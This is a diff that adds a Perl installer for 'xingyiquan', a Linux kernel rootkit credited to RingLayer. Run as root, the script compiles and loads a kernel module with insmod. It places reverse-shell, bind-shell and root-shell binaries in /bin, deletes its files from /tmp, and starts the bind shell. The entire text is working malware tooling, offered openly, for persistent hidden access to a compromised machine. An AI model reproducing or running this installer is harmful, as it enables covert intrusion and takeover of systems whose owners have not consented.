@@ -1,0 +1,116 @@
+#!/usr/bin/perl -U
+=pod
+ * xingyiquan - r00tk1t installer for linux kernel 2.6.x and 3.x
+ *  (c) Copyright by RingLayer All Rights Reserved 
+ * Developed by Sw0rdm4n
+ * 
+ * Official Website : www.ringlayer.net
+ * 
+ * Ringlayer Public License Statement V.1
+ * 1. This software is free software under copyright of Ringlayer's Public License
+ * 2. You may copy / modify / redistribute / share / use this software freely, but you are not allowed to remove copyright / author / url (where you got the source) if you don't modify source code logic at least 50%
+ * 3. You are not allowed to sell this source code without permission from author
+ * 4. Violation of any terms above means author have some rights for law processing and right to fine 
+ *
+ *
+DISCLAIMER !!!
+Author takes no responsibility for any abuse of this software. 
+=cut
+
+use strict;
+use warnings;
+
+sub __error()
+{
+	print "[-] installation failed ! please check error message !";
+	exit;
+}
+
+sub _check_priv()
+{
+	my $id;	
+
+	$id = getpwuid($<);
+	
+	if ($id ne "root") {
+		print "[-] error ! installation must be set with uid 0 (root), can not continue ! exit !\n";
+		exit;
+	}
+	else {
+		print "[+] installing as root user !\n";
+	}
+}
+
+sub _install()
+{
+	my $result;
+	my $line;
+	my $lkm_result;
+	
+	$result = "failed";
+	system("gcc -o xingyi_addr xingyi_addr.c -Wall");
+	if (-e "xingyi_addr") {
+		open(CEK, "./xingyi_addr |");
+      		while (<CEK>) {
+	       		$result .=  $_;
+			$line =  $_;
+			print $line;
+			sleep 1;
+		}
+		close(CEK);
+		if ($result =~/ready/) {
+			open(CEK_LKM, "cd xingyi_kernel_src;make |");
+			while (<CEK_LKM>) {
+	       			$lkm_result .=  $_;
+				$line =  $_;
+				print $line;
+			}
+			if ($result =~/error/) {
+				__error();
+			}
+			if (-e "xingyi_kernel_src/xingyiquan.ko") {
+				print "[+] lkm compiled successfully !\n";
+			}
+			else {
+				__error();
+			}
+			system("killall -9 xingyi_bindshell");
+			system("cd xingyi_userspace_src;gcc -o xingyi_reverse_shell xingyi_reverse_shell.c;gcc -o xingyi_bindshell xingyi_bindshell.c -Wall");
+			if (-e "xingyi_userspace_src/xingyi_reverse_shell" && -e "xingyi_userspace_src/xingyi_bindshell") {
+				system("/bin/cp -rf xingyi_userspace_src/xingyi_reverse_shell /bin/xingyi_reverse_shell");
+				system("/bin/cp -rf xingyi_userspace_src/xingyi_bindshell /bin/xingyi_bindshell");	
+				system("/bin/rm -rf /tmp/xingyi*");
+			}
+			else {
+				__error();
+			}
+			if (-e "/bin/xingyi_reverse_shell" && -e "/bin/xingyi_bindshell") {
+				print "[+] userspace binary ready to use !";
+			}
+			else {
+				__error();
+			}
+			#setting up rootsh3ll
+			system("cd xingyi_userspace_src;gcc -o xingyi_rootshell xingyi_rootshell.c; /bin/cp -rf xingyi_rootshell /bin/xingyi_rootshell");
+			if (-e "/bin/xingyi_rootshell") {
+				printf("[+] xingyi_rootshell ready on /bin !");
+			}
+			else {
+				__error();
+			}
+			system("xingyi_bindshell");		
+			system("cd xingyi_kernel_src;insmod xingyiquan.ko");
+			print "\n[+] your rootkit installed ! \n";
+			exit;
+		}
+		else {
+			__error();
+		}
+	}
+	else {
+		__error();
+	}
+}
+
+_check_priv();
+_install();
